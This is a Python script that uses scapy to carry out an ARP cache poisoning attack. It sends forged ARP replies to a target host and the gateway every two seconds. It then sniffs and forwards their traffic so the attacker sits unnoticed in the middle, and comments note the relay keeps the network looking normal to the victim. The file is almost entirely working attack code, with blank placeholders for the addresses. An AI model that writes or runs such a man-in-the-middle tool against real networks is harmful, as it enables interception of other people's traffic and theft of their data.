from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import threading

# specify ip and mac address
my_ip = ""
my_mac = ""
gateway_ip = ""
gateway_mac = ""
target_ip = ""
target_mac = ""

# sending arp reply packet to target device
def target_arp_poisoning():
    arp = ARP(op=2, hwsrc=my_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    send(arp)

# sending arp reply packet to gateway device
def gateway_arp_poisoning():
    arp = ARP(op=2, hwsrc=my_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
    send(arp)

# start poisoning
def poison():
    while True:
        target_arp_poisoning()
        gateway_arp_poisoning()
        time.sleep(2)

# after posioning, sniff packets destined for the gateway
def packet_relay_forward_gateway():
    sniff(filter="ip src "+target_ip+" and ether dst "+my_mac+" and ether src "+target_mac, prn=modify_packet_forward_gateway)

# after posioning, sniff packets destined for the target
def packet_relay_forward_target():
    sniff(filter="ether src "+gateway_mac+" and ip dst "+target_ip+" and ether dst "+my_mac, prn=modify_packet_forward_target)

# the reason for sniff and modifying the packet is to make the target recognize that it is normal networking

# after sniff, packet modification and send
def modify_packet_forward_gateway(packet):
    packet[Ether].src = my_mac
    packet[Ether].dst = gateway_mac
    sendp(packet)

# after sniff, packet modification and send
def modify_packet_forward_target(packet):
    packet[Ether].src = my_mac
    packet[Ether].dst = target_mac
    sendp(packet)

# make poison thread and start
poison_thread = threading.Thread(target=poison)
poison_thread.start()

# make packet request thread and start
packet_request_thread = threading.Thread(target=packet_relay_forward_gateway)
packet_request_thread.start()

# make packet reply thread and start
packet_reply_thread = threading.Thread(target=packet_relay_forward_target)
packet_reply_thread.start()